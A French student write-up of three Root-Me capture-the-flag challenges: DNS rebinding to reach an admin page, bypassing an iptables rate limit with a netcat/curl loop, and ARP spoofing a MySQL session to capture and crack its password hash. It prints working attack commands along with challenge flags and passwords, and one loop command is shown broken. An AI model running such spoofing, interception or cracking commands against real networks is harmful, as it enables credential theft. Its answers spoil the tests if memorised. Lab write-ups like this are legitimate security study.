# TP6 : Un peu de root-me

- [I. DNS Rebinding](#i-dns-rebinding)
- [II. Netfilter erreurs courantes](#ii-netfilter-erreurs-courantes)
- [III. ARP Spoofing Ecoute active](#iii-arp-spoofing-ecoute-active)



## I. DNS Rebinding

🌞 **Write-up de l'épreuve**

[Code source web](code-source.html)


En executant ce script, nous arrivons sur une page web avec, une page Admin bloquer, et l'utilisation basique qui est de recherche des sites via des URL.

Dans le code source ci-dessous : 

Nous comprenons que pour se connecter à la page admin, nous devons avoir une IP bien spécifique : `127.0.0.1`

En se renseignant sur le WEB, l'attaque DNS rebinding vise à spammer des requêtes DNS avec un TTL très bas permettant de tromper le site avec une IP différente.

Mettons cela en place, on trouve un tool sur internet : [DNS rebinding](https://lock.cmpxchg8b.com/rebinder.html)

Nous cherchons donc à crée un url utilisable, mais qui à l'IP pour se log en Admin, nous obtenons cela : ```7f000001.c0a80001.rbndr.us```

Ainsi il ne nous reste plus qu'à le rentrer dans la barre de recherhce incluse dans le site avec le bon lien vers la page admin : ```7f000001.c0a80001.rbndr.us:54022/admin```

Puis il faut spammmmmmm 

Et nous obtenons le flag !!!


## II. Netfilter erreurs courantes

🌞 **Write-up de l'épreuve**

[Code du Firewall](CodeFirewall.sh)


Même but pour cette épreuve, nous devons accéder à une page bloquer par le firewall. Lien de cette page avec le port 54017.

Lors de l'analyse de code nous pouvons s'apercevoir que plusieurs règle de connexion à la page bloqué sont en ACCEPT et d'autre en DROP.

Ici notre but va donc être de réaliser une tâche en ACCEPT pour pouvoir se connecter à la page bloquer.

Plusieur façon sont possible, comme usurper la whitlist ou autre mais nous nous allons nous intérreser à cette ligne précisement : ```IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP ```

Ici on voit que si on envoie plus de 20 paquet et bien on est autoriser à se log à la page.

Créons donc un script pour essayer si cela fonctionne : 

```
For i in {1..20}; do netcat challenge01.root-me.org 54017 & do | http://challenge01.root-me.org:54017/reseau/ch17
```  
Rien de bien compliqué donc, un script qui crée une boucle pour aller jusqu'à 20 et qui éxécute en fond un netcat sur le port 54017, puis un curl de l'URL voulu.

### Réponse 

```
matis@thinkpad:~$ for i in {1..20}; do netcat challenge01.root-me.org 54017 & done | curl http://challenge01.root-me.org:54017/reseau/ch17

Nicely done:)

There are probably a few things the administrator was missing when writing this ruleset:

    1) When a rule does not match, the next one is tested against

    2) When jumped in a user defined chain, if there is no match, then the
       search resumes at the next rule in the previous (calling) chain

    3) The 'limit' match is used to limit the rate at which a given rule can
       match: above this limit, 1) applies

    4) When a rule with a 'terminating' target (e.g.: ACCEPT, DROP...) matches
       a packet, then the search stops: the packet won't be tested against any 
       other rules
    

The flag is: saperlipopete
```

## III. ARP Spoofing Ecoute active

🌞 **Write-up de l'épreuve**

Pour ce challenge, le but va ếtre de réaliser un Man in the Middle entre une DB et un client afin de récuperer le mot de passe et de se connecte a la DB.

Pour commencer on nous allons si'dentifier : 

```
root@fac50de5d760:~# apt install iproute2
root@fac50de5d760:~#ip a

root@fac50de5d760:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@fac50de5d760:~#
```

Nous sommes identifié en 127.18.0.2/16

Faisons un petit scan de port : 

```
root@fac50de5d760:~#apt install nmap
```
[Scan nmap](scan-nmap.sh)

Ici plusieurs chose apparaisse, le client en (172.18.0.3) et la DB en (172.18.0.4).
Au passage la DB a le port 3306 ouvert.

Lancer notre spoofing avec arp-spoof : 

```
root@fac50de5d760:~#apt install dnsiff

root@fac50de5d760:~# arpspoof -t 172.18.0.3 -r 172.18.0.4
```

Ici la commande viens empoisonner la table arp du client en faisant croire que nous sommes la DB. 
Maintenant il est donc possible de recevoir les échanges entre le client et la db.

Pour capturer cela, on va faire un tcp dump sur le port 3306 de la db ouvert souvenez-vous.

```
root@fac50de5d760:~# apt install tcpdump
```

[Lien du dump](tcpdump.MD)

Par faciliter pour le lecteur j'ai mis que la ligne qui contient le flag.

OK, premiere partie de faite et il nous reste la plus facile et plus dure en même temps :)

Nous pouvons maintenant brut force le mot de passe, cela serait très rapide et efficace mais nous nous voulons aller plus loin...

Je mets quand même cette partie : 

On installe hydra, petite commande et hop !

[Brut force](Brut-force.sh)

### Deuxieme façon de trouver le mot de passe 

Dans le dump tcp reçu entre le client et la DB, nous voyons appairaitre le "salt" du mot de passe ainsi que son sha1, c'est une partie très interréssante car en faisant des recherches nous réussissons à trouver la concaténations logique du sha1 sur "mysql_native_password"

Ca donne ça :  ```x := SHA1(password) XOR SHA1(s + SHA1(SHA1(password)))```

Et en comprenant cela nous pouvons ainsi le brut force avec cette commande : 

```
matis@thinkpad:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:09791b4f3f1611084f1f581f3935400635333474 Bureau/root-me/rockyou.txt 6d33d57851fc677eaf4e4ffc7401b074300d472b
[*] loading file...
[*] found heyheyhey=6d33d57851fc677eaf4e4ffc7401b074300d472b
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords
```

Ici plusieurs choses sont importantes à comprendre, tout d'abord pour obtenir le salt du mot de passe, nous devions exporter le tcpdump en local avec la commande : 

```
matis@thinkpad:~$ sudo scp -P 22222 root@ctf20.root.me.org:/root/toto.pcap
```

Et dans la commande pour brut force le mot de passe on se rend compte que le salt est en héxadécimale, donc sur le dump nous devions récuperer l'héxa du salt qui doit faire exactement 20 octets (NE PAS SE TROMPER...)

Voilà voilà, le mot de passe est donc heyheyhey.